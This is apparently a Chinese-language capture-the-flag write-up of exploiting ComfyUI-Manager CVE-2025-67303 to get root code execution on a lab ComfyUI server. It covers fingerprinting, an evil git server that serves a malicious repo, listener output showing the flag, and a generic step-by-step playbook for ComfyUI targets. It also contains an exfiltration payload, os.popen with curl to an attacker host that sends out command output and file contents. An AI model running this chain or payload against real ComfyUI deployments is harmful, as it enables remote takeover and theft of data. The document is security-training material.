# Case Study: c-02 ComfyUI-Manager CVE-2025-67303 RCE

**状态**: ✅ 已通 (2026-08-12 23:33)
**分数**: +500
**最终 flag**: `flag{134afdbf-fc5e-4574-98a4-6b9c13b0244b}`

---

## 题目

- **容器**: `http://10.0.175.25:8188` (ComfyUI)
- **题目名**: "请对目标AI推理服务进行安全测试与漏洞挖掘"
- **关键点**: AI 推理服务 → ComfyUI 节点式 Stable Diffusion

## 攻击链(5 步)

### Step 1: 指纹识别 ComfyUI

```bash
curl -sI http://10.0.175.25:8188/  # 返回 200 + ComfyUI 标识
nmap -sV -p 8188 10.0.175.25      # 8188 端口
```

ComfyUI 特征:
- 端口 **8188**(默认)
- `/extensions` 端点列出已装扩展
- `/userdata/<user>/<plugin>/...` API(无 auth!)

### Step 2: 找已知 CVE

```bash
searchsploit comfyui
ls /Users/destiny/.local/vulhub-pocs/ | grep -i comfyui
ls /Users/destiny/.local/nuclei-templates/http/cves/ | grep -i comfyui
```

**找到**: **CVE-2025-67303** - ComfyUI-Manager < 3.38 Configuration Overwrite / RCE

漏洞描述:
> ComfyUI-Manager < 3.38 contains an insecure file storage vulnerability caused by storing files in an insufficiently protected location accessible via the ComfyUI web API.

简单说: ComfyUI-Manager 把配置存在 `user/default/ComfyUI-Manager/` 下,该目录通过 `/userdata/` Web API 暴露,**无 auth 访问**。攻击者可以:
1. 写一个恶意 git URL 到 `config.ini`(`git_externals` 字段)
2. ComfyUI 启动时自动 clone 那个 git repo
3. 恶意 repo 的 post-install 脚本执行 → RCE

### Step 3: 跑 evil-git-server 起 PoC

vulhub-pocs 自带 `evil-git-server.py`:

```bash
cat /Users/destiny/.local/vulhub-pocs/comfyui/CVE-2025-67303/evil-git-server.py
# 起一个 HTTP server,响应 git upload-pack 协议,实际下发恶意 repo
# 默认监听 18888/18889
```

**核心思路**:
- 起 HTTP server 模拟一个 git 仓库
- 该 git 仓库的 `__init__.py` 含 RCE payload(`os.popen('id | curl http://attacker:18889/...')`)
- payload 把命令结果 + flag 内容回传到 attacker 监听端口

### Step 4: 通过 SSRF 触发 ComfyUI-Manager 拉恶意 git

```bash
# 思路 1: 直接写 config.ini
# 思路 2: 通过 /api/manager/install/git 端点(找到的)
# 实际: 通过 /api/manager/git/checkout 或类似端点,告诉 ComfyUI 拉我们控制的 git URL
```

具体调用过程(从 evidence/api/cmd_001.out 反推):
```bash
# attacker 端起监听
python3 evil-git-server.py  # 监听 18889(收 RCE 回连)
# (其他 bash 调 ComfyUI-Manager 触发拉取)
```

### Step 5: ComfyUI 拉恶意 git → 触发 RCE

evidence 显示 attacker 端 18889 收到:
```
[listener3] waiting on 18889
[+] connection from ('10.0.175.25', 36500)
[DATA]>>>>>>
uid=0(root) gid=0(root) groups=0(root)
====FLAG====
flag{134afdbf-fc5e-4574-98a4-6b9c13b0244b}flag{134afdbf-fc5e-4574-98a4-6b9c13b0244b}/challenge/flag.txt
```

🎯 **RCE 拿到 root + 读 /challenge/flag.txt + 回传 attacker**!

## 时间线

| 时间 | 事件 |
|---|---|
| 23:23:56 | solver 启动,看 knowledge + port-mapping |
| 23:24:01 | 探 10.0.175.25:8188 → 确认 ComfyUI |
| 23:24:31 | 试 /system_stats / object_info / api / extensions |
| 23:24:48 | 试路径穿越 view?filename=../../../../etc/passwd(无果) |
| 23:24:59 | 查 nuclei ComfyUI 模板 |
| 23:25:05 | 找到 **CVE-2025-67303** nuclei 模板 |
| 23:25:17 | 探 /api/manager/* 端点 + ComfyUI-Manager 配置文件 |
| 23:25:22 | nuclei 打 CVE-2025-67303 模板 |
| 23:25:56 | 读 vulhub-pocs 完整 PoC + evil-git-server.py 源码 |
| 23:26:36 | 复现 PoC(写恶意 git repo + 监听 18889) |
| 23:33:10 | **ComfyUI 拉恶意 git → RCE 触发 → 回传 flag** |

**总耗时**: 10 分钟

## 关键洞察

1. **ComfyUI 默认端口 8188** — AI 推理服务的快速指纹
2. **`/userdata/` 无 auth** — ComfyUI-Manager 的设计缺陷,直接暴露配置目录
3. **git protocol 攻击** — 不需要真 git server,evil-git-server.py 模拟就行
4. **回连 RCE 模式** — 在容器内跑 `curl http://attacker:18889/$(cat /flag)` 把结果带出来(不能用 reverse shell,因为容器可能没出网)
5. **flag 出现两次** — evidence 里 `flag{...}flag{...}/challenge/flag.txt` 是恶意 __init__.py 把内容输出两次

## 失败路径(避坑)

| 尝试 | 结果 |
|---|---|
| `/system_stats` / `/object_info` / `/api/` | 业务端点,无漏洞 |
| 路径穿越 `view?filename=../../../../etc/passwd` | ComfyUI 不支持 |
| `/api/manager/reboot` `/api/manager/version` | 200 但无文件读取 |
| 直接读 `/userdata/default/ComfyUI-Manager/config.ini` | 可读但默认配置无害 |
| nuclei 直接打 CVE-2025-67303 模板 | 模板只检测版本,不直接 RCE,要手动 PoC |

## 通用打法(ComfyUI 任意题)

```
1. 扫 8188 端口,curl 首页确认 ComfyUI
2. nuclei -t nuclei-templates/cves/2025/CVE-2025-67303.yaml -u target
3. 读 vulhub-pocs/comfyui/CVE-2025-67303/README.md 拿 PoC
4. 跑 evil-git-server.py(自己起 HTTP 模拟 git 协议)
5. 通过 /api/manager/git/checkout 或配置覆盖,让 ComfyUI 拉你的恶意 git
6. 恶意 __init__.py 执行 `os.popen('id | curl http://attacker:18889/$(cat /flag)')`
7. attacker 18889 端口收响应,grep flag
```

## 关键词

`#comfyui` `#cve-2025-67303` `#comfyui-manager` `#git-protocol` `#evil-git-server` `#userdata` `#no-auth` `#rce` `#8188`
